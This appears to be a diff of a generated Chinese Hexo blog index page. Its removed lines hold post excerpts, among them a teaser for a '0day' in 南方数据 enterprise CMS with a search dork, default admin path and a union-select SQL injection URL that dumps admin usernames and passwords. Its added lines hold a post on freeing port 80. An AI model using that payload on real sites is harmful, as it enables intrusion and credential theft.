@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="沐小晨曦 | Omooo">
-<meta property="og:url" content="http://yoursite.com/page/17/index.html">
+<meta property="og:url" content="http://yoursite.com/page/22/index.html">
 <meta property="og:site_name" content="沐小晨曦 | Omooo">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="沐小晨曦 | Omooo">
@@ -143,7 +143,7 @@
       <div class="body-wrap">
         
   
-    <article id="post-实例演示参数化查询防止SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-80端口被占用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -152,184 +152,22 @@
     <div class="article-entry" itemprop="articleBody">
       
         <hr>
-<h2 id="实例演示参数化查询防止-SQL-注入"><a href="#实例演示参数化查询防止-SQL-注入" class="headerlink" title="实例演示参数化查询防止 SQL 注入"></a>实例演示参数化查询防止 SQL 注入</h2><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>SQL 注入的危害就不用我多说了，之前也有文章从攻的层面写过关于此的。今天主要是从防的层面来写这篇文章。本篇从两个角度来防止SQL注入，前端验证用户输入，后端做参数化查询。</p>
-<p><img src="http://i4.buimg.com/567571/c98d46651511b01f.jpg" alt=""></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/07/14/实例演示参数化查询防止SQL注入/#more">more >></a>
-        </p>
+<h2 id="解决80端口被占用的尴尬处境"><a href="#解决80端口被占用的尴尬处境" class="headerlink" title="解决80端口被占用的尴尬处境"></a>解决80端口被占用的尴尬处境</h2><ol>
+<li><p>首先打开cmd输入命令netstat-ano查看80端口被占用情况，如果PID为4，这说明是hhtp服务占用了80端口，这时候输入命令net stop http服务。也可以输入taskkill / pid 4 /f或者ntsd -c q -p 4。如果是其他进程，查看PID之后在任务管理器里结束该进程。</p>
+</li>
+<li><p>打开注册表把start值改为零之后重启。（来自网上的办法，亲测没效，自己也可以试试）</p>
+</li>
+<li><p>如果你装了SQL，或许是SQL serve的某些进程占用了，这时候可以在计算机管理里面打开服务结束SQL Serve Reporting Services，或者在cmd中net stop ReportServe。</p>
+<p>​</p>
+</li>
+</ol>
+<h5 id="最后建议自己好好看看-Http-Serve-API"><a href="#最后建议自己好好看看-Http-Serve-API" class="headerlink" title="最后建议自己好好看看 Http Serve API "></a>最后建议自己好好看看 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa364510" target="_blank" rel="external">Http Serve API </a></h5>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2017/07/14/实例演示参数化查询防止SQL注入/" class="archive-article-date">
-  	<time datetime="2017-07-14T07:28:51.306Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
-</a>
-      
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-图片识别" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="美眉别唬我，我很单纯"><a href="#美眉别唬我，我很单纯" class="headerlink" title="美眉别唬我，我很单纯"></a>美眉别唬我，我很单纯</h2><p>今天看到小基友发了这张图，瞬间心情复杂。</p>
-<p><img src="http://i1.piimg.com/567571/049695cb0ae0ea21.png" alt=""></p>
-<p>恕我直言，心情犹如吃 si 一样。</p>
-<p><img src="http://i1.piimg.com/567571/bb31fb7d83c6256e.jpg" alt=""></p>
-<p>我这么单纯为什么要这样对我？还我一个真实的世界吧。如何辨别网图或者被P过的图片呢？</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/07/14/图片识别/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/07/14/图片识别/" class="archive-article-date">
-  	<time datetime="2017-07-14T07:28:51.300Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
-</a>
-      
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-南方0day" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="南方数据企业0day漏洞"><a href="#南方数据企业0day漏洞" class="headerlink" title="南方数据企业0day漏洞"></a>南方数据企业0day漏洞</h2><p><strong>00x0 漏洞简述</strong></p>
-<p>该漏洞其实早就爆出了。</p>
-<p>漏洞影响版本 v10.0、v11.0。</p>
-<p>关键字：“inurl:HomeMarket.asp”</p>
-<p>默认后台：/admin</p>
-<p>直接爆出用户密码，构造 URL 如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/NewsType.asp?SmallClass=&apos; union select 0,username+CHR(124)+password,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and &apos;&apos;=&apos;</div></pre></td></tr></table></figure>
-<p>拿 shell 方法貌似有三种：</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/07/14/南方0day/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/07/14/南方0day/" class="archive-article-date">
-  	<time datetime="2017-07-14T07:28:51.294Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
-</a>
-      
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-加密文件" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="勒索软件，该怎么玩？"><a href="#勒索软件，该怎么玩？" class="headerlink" title="勒索软件，该怎么玩？"></a>勒索软件，该怎么玩？</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到关于勒索软件病毒攻击的文章铺天盖地，主要是这次专门针对大学生，国内多所院校出现ONION勒索软件感染情况，磁盘文件会被病毒加密为.onion后缀，只有支付高额赎金才能恢复被加密的文件，对学习资料和个人数据造成严重损失。不过还好，我们学校宿舍都是接入家用电信网，默认445端口关闭，一点都不慌。</p>
-<p>想到以前撸过的一个加密文件的成品，今天就来介绍一下。</p>
-<p><img src="https://ooo.0o0.ooo/2017/05/13/59167b0a9e4bc.png" alt=""></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/07/14/加密文件/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/07/14/加密文件/" class="archive-article-date">
-  	<time datetime="2017-07-14T07:28:51.288Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
-</a>
-      
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-分词" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="听了那么多逼哥，逼哥到底再讲什么？"><a href="#听了那么多逼哥，逼哥到底再讲什么？" class="headerlink" title="听了那么多逼哥，逼哥到底再讲什么？"></a>听了那么多逼哥，逼哥到底再讲什么？</h2><p><strong>00x1 前言</strong></p>
-<p>作为逼粉，不想多逼逼，用逼哥的歌词来分析逼哥到底在讲什么，歌曲都是大家熟知的那些歌，大约1.2W字吧。做这个主要是想玩玩分词，第三方类库 Jieba。其实可以爬网易云上的，但是我为什么没有这样做呢？因为不会。。。</p>
-<p><img src="https://ooo.0o0.ooo/2017/05/07/590f356bdeb8e.jpg" alt=""></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/07/14/分词/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/07/14/分词/" class="archive-article-date">
-  	<time datetime="2017-07-14T07:28:51.283Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
+      <a href="/2017/07/14/80端口被占用/" class="archive-article-date">
+  	<time datetime="2017-07-14T07:28:51.173Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
 </a>
       
       
@@ -351,7 +189,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/16/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/18/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/21/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span>
     </nav>
   
 
